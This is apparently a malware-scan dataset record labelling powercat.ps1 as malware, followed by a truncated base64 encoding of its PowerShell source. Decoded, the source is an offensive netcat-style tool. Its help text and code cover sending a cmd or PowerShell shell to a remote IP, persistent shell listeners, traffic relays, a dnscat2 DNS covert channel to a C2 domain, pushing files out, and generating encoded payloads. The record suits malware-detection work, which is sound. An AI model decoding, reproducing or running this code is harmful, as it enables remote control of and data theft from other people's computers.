powercat.ps1,118e9e0655833b7f5cd92d5b7f2f6503,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gcG93ZXJjYXQKewogIHBhcmFtKAogICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjPSIiLAogICAgW2FsaWFzKCJMaXN0ZW4iKV1bc3dpdGNoXSRsPSRGYWxzZSwKICAgIFthbGlhcygiUG9ydCIpXVtQYXJhbWV0ZXIoUG9zaXRpb249LTEpXVtzdHJpbmddJHA9IiIsCiAgICBbYWxpYXMoIkV4ZWN1dGUiKV1bc3RyaW5nXSRlPSIiLAogICAgW2FsaWFzKCJFeGVjdXRlUG93ZXJzaGVsbCIpXVtzd2l0Y2hdJGVwPSRGYWxzZSwKICAgIFthbGlhcygiUmVsYXkiKV1bc3RyaW5nXSRyPSIiLAogICAgW2FsaWFzKCJVRFAiKV1bc3dpdGNoXSR1PSRGYWxzZSwKICAgIFthbGlhcygiZG5zY2F0MiIpXVtzdHJpbmddJGRucz0iIiwKICAgIFthbGlhcygiRE5TRmFpbHVyZVRocmVzaG9sZCIpXVtpbnQzMl0kZG5zZnQ9MTAsCiAgICBbYWxpYXMoIlRpbWVvdXQiKV1baW50MzJdJHQ9NjAsCiAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV1bYWxpYXMoIklucHV0IildJGk9JG51bGwsCiAgICBbVmFsaWRhdGVTZXQoJ0hvc3QnLCAnQnl0ZXMnLCAnU3RyaW5nJyldW2FsaWFzKCJPdXRwdXRUeXBlIildW3N0cmluZ10kbz0iSG9zdCIsCiAgICBbYWxpYXMoIk91dHB1dEZpbGUiKV1bc3RyaW5nXSRvZj0iIiwKICAgIFthbGlhcygiRGlzY29ubmVjdCIpXVtzd2l0Y2hdJGQ9JEZhbHNlLAogICAgW2FsaWFzKCJSZXBlYXRlciIpXVtzd2l0Y2hdJHJlcD0kRmFsc2UsCiAgICBbYWxpYXMoIkdlbmVyYXRlUGF5bG9hZCIpXVtzd2l0Y2hdJGc9JEZhbHNlLAogICAgW2FsaWFzKCJHZW5lcmF0ZUVuY29kZWQiKV1bc3dpdGNoXSRnZT0kRmFsc2UsCiAgICBbYWxpYXMoIkhlbHAiKV1bc3dpdGNoXSRoPSRGYWxzZQogICkKICAKICAjIyMjIyMjIyMjIyMjIyMgSEVMUCAjIyMjIyMjIyMjIyMjIyMKICAkSGVscCA9ICIKcG93ZXJjYXQgLSBOZXRjYXQsIFRoZSBQb3dlcnNoZWxsIFZlcnNpb24KR2l0aHViIFJlcG9zaXRvcnk6IGh0dHBzOi8vZ2l0aHViLmNvbS9iZXNpbW9yaGluby9wb3dlcmNhdAoKVGhpcyBzY3JpcHQgYXR0ZW1wdHMgdG8gaW1wbGVtZW50IHRoZSBmZWF0dXJlcyBvZiBuZXRjYXQgaW4gYSBwb3dlcnNoZWxsCnNjcmlwdC4gSXQgYWxzbyBjb250YWlucyBleHRyYSBmZWF0dXJlcyBzdWNoIGFzIGJ1aWx0LWluIHJlbGF5cywgZXhlY3V0ZQpwb3dlcnNoZWxsLCBhbmQgYSBkbnNjYXQyIGNsaWVudC4KClVzYWdlOiBwb3dlcmNhdCBbLWMgb3IgLWxdIFstcCBwb3J0XSBbb3B0aW9uc10KCiAgLWMgIDxpcD4gICAgICAgIENsaWVudCBNb2RlLiBQcm92aWRlIHRoZSBJUCBvZiB0aGUgc3lzdGVtIHlvdSB3aXNoIHRvIGNvbm5lY3QgdG8uCiAgICAgICAgICAgICAgICAgIElmIHlvdSBhcmUgdXNpbmcgLWRucywgc3BlY2lmeSB0aGUgRE5TIFNlcnZlciB0byBzZW5kIHF1ZXJpZXMgdG8uCiAgICAgICAgICAgIAogIC1sICAgICAgICAgICAgICBMaXN0ZW4gTW9kZS4gU3RhcnQgYSBsaXN0ZW5lciBvbiB0aGUgcG9ydCBzcGVjaWZpZWQgYnkgLXAuCiAgCiAgLXAgIDxwb3J0PiAgICAgIFBvcnQuIFRoZSBwb3J0IHRvIGNvbm5lY3QgdG8sIG9yIHRoZSBwb3J0IHRvIGxpc3RlbiBvbi4KICAKICAtZSAgPHByb2M+ICAgICAgRXhlY3V0ZS4gU3BlY2lmeSB0aGUgbmFtZSBvZiB0aGUgcHJvY2VzcyB0byBzdGFydC4KICAKICAtZXAgICAgICAgICAgICAgRXhlY3V0ZSBQb3dlcnNoZWxsLiBTdGFydCBhIHBzZXVkbyBwb3dlcnNoZWxsIHNlc3Npb24uIFlvdSBjYW4KICAgICAgICAgICAgICAgICAgZGVjbGFyZSB2YXJpYWJsZXMgYW5kIGV4ZWN1dGUgY29tbWFuZHMsIGJ1dCBpZiB5b3UgdHJ5IHRvIGVudGVyCiAgICAgICAgICAgICAgICAgIGFub3RoZXIgc2hlbGwgKG5zbG9va3VwLCBuZXRzaCwgY21kLCBldGMuKSB0aGUgc2hlbGwgd2lsbCBoYW5nLgogICAgICAgICAgICAKICAtciAgPHN0cj4gICAgICAgUmVsYXkuIFVzZWQgZm9yIHJlbGF5aW5nIG5ldHdvcmsgdHJhZmZpYyBiZXR3ZWVuIHR3byBub2Rlcy4KICAgICAgICAgICAgICAgICAgQ2xpZW50IFJlbGF5IEZvcm1hdDogICAtciA8cHJvdG9jb2w+OjxpcCBhZGRyPjo8cG9ydD4KICAgICAgICAgICAgICAgICAgTGlzdGVuZXIgUmVsYXkgRm9ybWF0OiAtciA8cHJvdG9jb2w+Ojxwb3J0PgogICAgICAgICAgICAgICAgICBETlNDYXQyIFJlbGF5IEZvcm1hdDogIC1yIGRuczo8ZG5zIHNlcnZlcj46PGRucyBwb3J0Pjo8ZG9tYWluPgogICAgICAgICAgICAKICAtdSAgICAgICAgICAgICAgVURQIE1vZGUuIFNlbmQgdHJhZmZpYyBvdmVyIFVEUC4gQmVjYXVzZSBpdCdzIFVEUCwgdGhlIGNsaWVudAogICAgICAgICAgICAgICAgICBtdXN0IHNlbmQgZGF0YSBiZWZvcmUgdGhlIHNlcnZlciBjYW4gcmVzcG9uZC4KICAgICAgICAgICAgCiAgLWRucyAgPGRvbWFpbj4gIEROUyBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciB0aGUgZG5zY2F0MiBkbnMgY292ZXJ0IGNoYW5uZWwuCiAgICAgICAgICAgICAgICAgIFNwZWNpZnkgdGhlIGRucyBzZXJ2ZXIgdG8gLWMsIHRoZSBkbnMgcG9ydCB0byAtcCwgYW5kIHNwZWNpZnkgdGhlIAogICAgICAgICAgICAgICAgICBkb21haW4gdG8gdGhpcyBvcHRpb24sIC1kbnMuIFRoaXMgaXMgb25seSBhIGNsaWVudC4KICAgICAgICAgICAgICAgICAgR2V0IHRoZSBzZXJ2ZXIgaGVyZTogaHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0MgogICAgICAgICAgICAKICAtZG5zZnQgPGludD4gICAgRE5TIEZhaWx1cmUgVGhyZXNob2xkLiBUaGlzIGlzIGhvdyBtYW55IGJhZCBwYWNrZXRzIHRoZSBjbGllbnQgY2FuCiAgICAgICAgICAgICAgICAgIHJlY2lldmUgYmVmb3JlIGV4aXRpbmcuIFNldCB0byB6ZXJvIHdoZW4gcmVjZWl2aW5nIGZpbGVzLCBhbmQgc2V0IGhpZ2gKICAgICAgICAgICAgICAgICAgZm9yIG1vcmUgc3RhYmlsaXR5IG92ZXIgdGhlIGludGVybmV0LgogICAgICAgICAgICAKICAtdCAgPGludD4gICAgICAgVGltZW91dC4gVGhlIG51bWJlciBvZiBzZWNvbmRzIHRvIHdhaXQgYmVmb3JlIGdpdmluZyB1cCBvbiBsaXN0ZW5pbmcgb3IKICAgICAgICAgICAgICAgICAgY29ubmVjdGluZy4gRGVmYXVsdDogNjAKICAgICAgICAgICAgCiAgLWkgIDxpbnB1dD4gICAgIElucHV0LiBQcm92aWRlIGRhdGEgdG8gYmUgc2VudCBkb3duIHRoZSBwaXBlIGFzIHNvb24gYXMgYSBjb25uZWN0aW9uIGlzCiAgICAgICAgICAgICAgICAgIGVzdGFibGlzaGVkLiBVc2VkIGZvciBtb3ZpbmcgZmlsZXMuIFlvdSBjYW4gcHJvdmlkZSB0aGUgcGF0aCB0byBhIGZpbGUsCiAgICAgICAgICAgICAgICAgIGEgYnl0ZSBhcnJheSBvYmplY3QsIG9yIGEgc3RyaW5nLiBZb3UgY2FuIGFsc28gcGlwZSBhbnkgb2YgdGhvc2UgaW50bwogICAgICAgICAgICAgICAgICBwb3dlcmNhdCwgbGlrZSAnYWFhYWFhJyB8IHBvd2VyY2F0IC1jIDEwLjEuMS4xIC1wIDgwCiAgICAgICAgICAgIAogIC1vICA8dHlwZT4gICAgICBPdXRwdXQuIFNwZWNpZnkgaG93IHBvd2VyY2F0IHNob3VsZCByZXR1cm4gaW5mb3JtYXRpb24gdG8gdGhlIGNvbnNvbGUuCiAgICAgICAgICAgICAgICAgIFZhbGlkIG9wdGlvbnMgYXJlICdCeXRlcycsICdTdHJpbmcnLCBvciAnSG9zdCcuIERlZmF1bHQgaXMgJ0hvc3QnLgogICAgICAgICAgICAKICAtb2YgPHBhdGg+ICAgICAgT3V0cHV0IEZpbGUuICBTcGVjaWZ5IHRoZSBwYXRoIHRvIGEgZmlsZSB0byB3cml0ZSBvdXRwdXQgdG8uCiAgICAgICAgICAgIAogIC1kICAgICAgICAgICAgICBEaXNjb25uZWN0LiBwb3dlcmNhdCB3aWxsIGRpc2Nvbm5lY3QgYWZ0ZXIgdGhlIGNvbm5lY3Rpb24gaXMgZXN0YWJsaXNoZWQKICAgICAgICAgICAgICAgICAgYW5kIHRoZSBpbnB1dCBmcm9tIC1pIGlzIHNlbnQuIFVzZWQgZm9yIHNjYW5uaW5nLgogICAgICAgICAgICAKICAtcmVwICAgICAgICAgICAgUmVwZWF0ZXIuIHBvd2VyY2F0IHdpbGwgY29udGludWFsbHkgcmVzdGFydCBhZnRlciBpdCBpcyBkaXNjb25uZWN0ZWQuCiAgICAgICAgICAgICAgICAgIFVzZWQgZm9yIHNldHRpbmcgdXAgYSBwZXJzaXN0ZW50IHNlcnZlci4KICAgICAgICAgICAgICAgICAgCiAgLWcgICAgICAgICAgICAgIEdlbmVyYXRlIFBheWxvYWQuICBSZXR1cm5zIGEgc2NyaXB0IGFzIGEgc3RyaW5nIHdoaWNoIHdpbGwgZXhlY3V0ZSB0aGUKICAgICAgICAgICAgICAgICAgcG93ZXJjYXQgd2l0aCB0aGUgb3B0aW9ucyB5b3UgaGF2ZSBzcGVjaWZpZWQuIC1pLCAtZCwgYW5kIC1yZXAgd2lsbCBub3QKICAgICAgICAgICAgICAgICAgYmUgaW5jb3Jwb3JhdGVkLgogICAgICAgICAgICAgICAgICAKICAtZ2UgICAgICAgICAgICAgR2VuZXJhdGUgRW5jb2RlZCBQYXlsb2FkLiBEb2VzIHRoZSBzYW1lIGFzIC1nLCBidXQgcmV0dXJucyBhIHN0cmluZyB3aGljaAogICAgICAgICAgICAgICAgICBjYW4gYmUgZXhlY3V0ZWQgaW4gdGhpcyB3YXk6IHBvd2Vyc2hlbGwgLUUgPGVuY29kZWQgc3RyaW5nPgoKICAtaCAgICAgICAgICAgICAgUHJpbnQgdGhpcyBoZWxwIG1lc3NhZ2UuCgpFeGFtcGxlczoKCiAgTGlzdGVuIG9uIHBvcnQgODAwMCBhbmQgcHJpbnQgdGhlIG91dHB1dCB0byB0aGUgY29uc29sZS4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMAogIAogIENvbm5lY3QgdG8gMTAuMS4xLjEgcG9ydCA0NDMsIHNlbmQgYSBzaGVsbCwgYW5kIGVuYWJsZSB2ZXJib3NpdHkuCiAgICAgIHBvd2VyY2F0IC1jIDEwLjEuMS4xIC1wIDQ0MyAtZSBjbWQgLXYKICAKICBDb25uZWN0IHRvIHRoZSBkbnNjYXQyIHNlcnZlciBvbiBjMi5leGFtcGxlLmNvbSwgYW5kIHNlbmQgZG5zIHF1ZXJpZXMKICB0byB0aGUgZG5zIHNlcnZlciBvbiAxMC4xLjEuMSBwb3J0IDUzLgogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA1MyAtZG5zIGMyLmV4YW1wbGUuY29tCiAgCiAgU2VuZCBhIGZpbGUgdG8gMTAuMS4xLjE1IHBvcnQgODAwMC4KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjE1IC1wIDgwMDAgLWkgQzpcaW5wdXRmaWxlCiAgCiAgV3JpdGUgdGhlIGRhdGEgc2VudCB0byB0aGUgbG9jYWwgbGlzdGVuZXIgb24gcG9ydCA0NDQ0IHRvIEM6XG91dGZpbGUKICAgICAgcG93ZXJjYXQgLWwgLXAgNDQ0NCAtb2YgQzpcb3V0ZmlsZQogIAogIExpc3RlbiBvbiBwb3J0IDgwMDAgYW5kIHJlcGVhdGVkbHkgc2VydmVyIGEgcG93ZXJzaGVsbCBzaGVsbC4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtZXAgLXJlcAogIAogIFJlbGF5IHRyYWZmaWMgY29taW5nIGluIG9uIHBvcnQgODAwMCBvdmVyIHRjcCB0byBwb3J0IDkwMDAgb24gMTAuMS4xLjEgb3ZlciB0Y3AuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgdGNwOjEwLjEuMS4xOjkwMDAKICAgICAgCiAgUmVsYXkgdHJhZmZpYyBjb21pbmcgaW4gb24gcG9ydCA4MDAwIG92ZXIgdGNwIHRvIHRoZSBkbnNjYXQyIHNlcnZlciBvbiBjMi5leGFtcGxlLmNvbSwKICBzZW5kaW5nIHF1ZXJpZXMgdG8gMTAuMS4xLjEgcG9ydCA1My4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtciBkbnM6MTAuMS4xLjE6NTM6YzIuZXhhbXBsZS5jb20KIgogIGlmKCRoKXtyZXR1cm4gJEhlbHB9CiAgIyMjIyMjIyMjIyMjIyMjIEhFTFAgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyMjIyMjIFZBTElEQVRFIEFSR1MgIyMjIyMjIyMjIyMjIyMjCiAgJGdsb2JhbDpWZXJib3NlID0gJFZlcmJvc2UKICBpZigkb2YgLW5lICcnKXskbyA9ICdCeXRlcyd9CiAgaWYoJGRucyAtZXEgIiIpCiAgewogICAgaWYoKCgkYyAtZXEgIiIpIC1hbmQgKCEkbCkpIC1vciAoKCRjIC1uZSAiIikgLWFuZCAkbCkpe3JldHVybiAiWW91IG11c3Qgc2VsZWN0IGVpdGhlciBjbGllbnQgbW9kZSAoLWMpIG9yIGxpc3RlbiBtb2RlICgtbCkuIn0KICAgIGlmKCRwIC1lcSAiIil7cmV0dXJuICJQbGVhc2UgcHJvdmlkZSBhIHBvcnQgbnVtYmVyIHRvIC1wLiJ9CiAgfQogIGlmKCgoKCRyIC1uZSAiIikgLWFuZCAoJGUgLW5lICIiKSkgLW9yICgoJGUgLW5lICIiKSAtYW5kICgkZXApKSkgLW9yICAoKCRyIC1uZSAiIikgLWFuZCAoJGVwKSkpe3JldHVybiAiWW91IGNhbiBvbmx5IHBpY2sgb25lIG9mIHRoZXNlOiAtZSwgLWVwLCAtciJ9CiAgaWYoKCRpIC1uZSAkbnVsbCkgLWFuZCAoKCRyIC1uZSAiIikgLW9yICgkZSAtbmUgIiIpKSl7cmV0dXJuICItaSBpcyBub3QgYXBwbGljYWJsZSBoZXJlLiJ9CiAgaWYoJGwpCiAgewogICAgJEZhaWx1cmUgPSAkRmFsc2UKICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZigoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkcCl7V3JpdGUtT3V0cHV0ICgiVGhlIHNlbGVjdGVkIHBvcnQgIiArICRwICsgIiBpcyBhbHJlYWR5IGluIHVzZS4iKSA7ICRGYWlsdXJlPSRUcnVlfX0KICAgIGlmKCRGYWlsdXJlKXticmVha30KICB9CiAgaWYoJHIgLW5lICIiKQogIHsKICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpCiAgICB7CiAgICAgICRGYWlsdXJlID0gJEZhbHNlCiAgICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZigoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkci5zcGxpdCgiOiIpWzFdKXtXcml0ZS1PdXRwdXQgKCJUaGUgc2VsZWN0ZWQgcG9ydCAiICsgJHIuc3BsaXQoIjoiKVsxXSArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19CiAgICAgIGlmKCRGYWlsdXJlKXticmVha30KICAgIH0KICB9CiAgIyMjIyMjIyMjIyMjIyMjIFZBTElEQVRFIEFSR1MgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfVURQCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9CiAgICAkYywkbCwkcCwkdCA9ICRGdW5jU2V0dXBWYXJzCiAgICAkRnVuY1ZhcnMgPSBAe30KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgaWYoJGwpCiAgICB7CiAgICAgICRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlciA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA2NTUzNgogICAgICAkRW5kUG9pbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCAoW1N5c3RlbS5OZXQuSVBBZGRyZXNzXTo6QW55KSwgJHAKICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudCAkcAogICAgICAkUGFja2V0SW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLklQUGFja2V0SW5mb3JtYXRpb24KICAgICAgV3JpdGUtVmVyYm9zZSAoIkxpc3RlbmluZyBvbiBbMC4wLjAuMF0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIikKICAgICAgJENvbm5lY3RIYW5kbGUgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVNZXNzYWdlRnJvbSgkU29ja2V0RGVzdGluYXRpb25CdWZmZXIsMCw2NTUzNixbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSxbcmVmXSRFbmRQb2ludCwkbnVsbCwkbnVsbCkKICAgICAgJFN0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICB3aGlsZSgkVHJ1ZSkKICAgICAgewogICAgICAgIGlmKCRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkKICAgICAgICB7CiAgICAgICAgICBpZihAKDE3LDI3KSAtY29udGFpbnMgKCRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoIk5vRWNobyxJbmNsdWRlS2V5RG93biIpLlZpcnR1YWxLZXlDb2RlKSkKICAgICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBVRFAgU2V0dXAuLi4iCiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICBicmVhawogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkKICAgICAgICB7CiAgICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCkKICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhawogICAgICAgIH0KICAgICAgICBpZigkQ29ubmVjdEhhbmRsZS5Jc0NvbXBsZXRlZCkKICAgICAgICB7CiAgICAgICAgICAkU29ja2V0Qnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZU1lc3NhZ2VGcm9tKCRDb25uZWN0SGFuZGxlLFtyZWZdKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRFbmRQb2ludCxbcmVmXSRQYWNrZXRJbmZvKQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJEVuZFBvaW50LlBvcnQgKyAiKSIpCiAgICAgICAgICBpZigkU29ja2V0Qnl0ZXNSZWFkIC1ndCAwKXticmVha30KICAgICAgICAgIGVsc2V7YnJlYWt9CiAgICAgICAgfQogICAgICB9CiAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICRGdW5jVmFyc1siSW5pdGlhbENvbm5lY3Rpb25CeXRlcyJdID0gJFNvY2tldERlc3RpbmF0aW9uQnVmZmVyWzAuLihbaW50XSRTb2NrZXRCeXRlc1JlYWQtMSldCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgIGlmKCEkYy5Db250YWlucygiLiIpKQogICAgICB7CiAgICAgICAgJElQTGlzdCA9IEAoKQogICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAleyRJUExpc3QgKz0gJF8uSVBBZGRyZXNzVG9TdHJpbmd9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAoIk5hbWUgIiArICRjICsgIiByZXNvbHZlZCB0byBhZGRyZXNzICIgKyAkSVBMaXN0WzBdKQogICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkSVBMaXN0WzBdKSksICRwCiAgICAgIH0KICAgICAgZWxzZQogICAgICB7CiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRjKSksICRwCiAgICAgIH0KICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudAogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNvbm5lY3QoJGMsJHApCiAgICAgIFdyaXRlLVZlcmJvc2UgKCJTZW5kaW5nIFVEUCB0cmFmZmljIHRvICIgKyAkYyArICIgcG9ydCAiICsgJHAgKyAiLi4uIikKICAgICAgV3JpdGUtVmVyYm9zZSAoIlVEUDogTWFrZSBzdXJlIHRvIHNlbmQgc29tZSBkYXRhIHNvIHRoZSBzZXJ2ZXIgY2FuIG5vdGljZSB5b3UhIikKICAgIH0KICAgICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdID0gNjU1MzYKICAgICRGdW5jVmFyc1siRW5kUG9pbnQiXSA9ICRFbmRQb2ludAogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdCiAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLDAsJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwkbnVsbCwkbnVsbCkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gUmVhZERhdGFfVURQCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJERhdGEgPSAkbnVsbAogICAgaWYoJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpCiAgICB7CiAgICAgICRTdHJlYW1CeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5FbmRSZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSkKICAgICAgaWYoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9CiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdHJlYW1CeXRlc1JlYWQtMSldCiAgICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuQmVnaW5SZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sMCwkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwoW1N5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXRGbGFnc106Ok5vbmUpLFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdLCRudWxsLCRudWxsKQogICAgfQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBXcml0ZURhdGFfVURQCiAgewogICAgcGFyYW0oJERhdGEsJEZ1bmNWYXJzKQogICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuU2VuZFRvKCREYXRhLCRGdW5jVmFyc1siRW5kUG9pbnQiXSkgfCBPdXQtTnVsbAogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBDbG9zZV9VRFAKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCkKICB9CiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgCiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCiAgZnVuY3Rpb24gU2V0dXBfRE5TCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICBpZigkZ2xvYmFsOlZlcmJvc2UpeyRWZXJib3NlID0gJFRydWV9CiAgICBmdW5jdGlvbiBDb252ZXJ0VG8tSGV4QXJyYXkKICAgIHsKICAgICAgcGFyYW0oJFN0cmluZykKICAgICAgJEhleCA9IEAoKQogICAgICAkU3RyaW5nLlRvQ2hhckFycmF5KCkgfCAlIHsiezA6eH0iIC1mIFtieXRlXSRffSB8ICUge2lmKCRfLkxlbmd0aCAtZXEgMSl7IjAiICsgW3N0cmluZ10kX30gZWxzZXtbc3RyaW5nXSRffX0gfCAlIHskSGV4ICs9ICRffQogICAgICByZXR1cm4gJEhleAogICAgfQogICAgCiAgICBmdW5jdGlvbiBTZW5kUGFja2V0CiAgICB7CiAgICAgIHBhcmFtKCRQYWNrZXQsJEROU1NlcnZlciwkRE5TUG9ydCkKICAgICAgJENvbW1hbmQgPSAoInNldCB0eXBlPVRYVGBuc2VydmVyICRETlNTZXJ2ZXJgbnNldCBwb3J0PSRETlNQb3J0YG5zZXQgZG9tYWluPS5jb21gbnNldCByZXRyeT0xYG4iICsgJFBhY2tldCArICJgbmV4aXQiKQogICAgICAkcmVzdWx0ID0gKCRDb21tYW5kIHwgbnNsb29rdXAgMj4mMSB8IE91dC1TdHJpbmcpCiAgICAgIGlmKCRyZXN1bHQuQ29udGFpbnMoJyInKSl7cmV0dXJuIChbcmVnZXhdOjpNYXRjaCgkcmVzdWx0LnJlcGxhY2UoImJpbz0iLCIiKSwnKD88PSIpW14iXSooPz0iKScpLlZhbHVlKX0KICAgICAgZWxzZXtyZXR1cm4gMX0KICAgIH0KICAgIAogICAgZnVuY3Rpb24gQ3JlYXRlX1NZTgogICAgewogICAgICBwYXJhbSgkU2Vzc2lvbklkLCRTZXFOdW0sJFRhZywkRG9tYWluKQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIuMDAuIiArICRTZXNzaW9uSWQgKyAiLiIgKyAkU2VxTnVtICsgIi4wMDAwIiA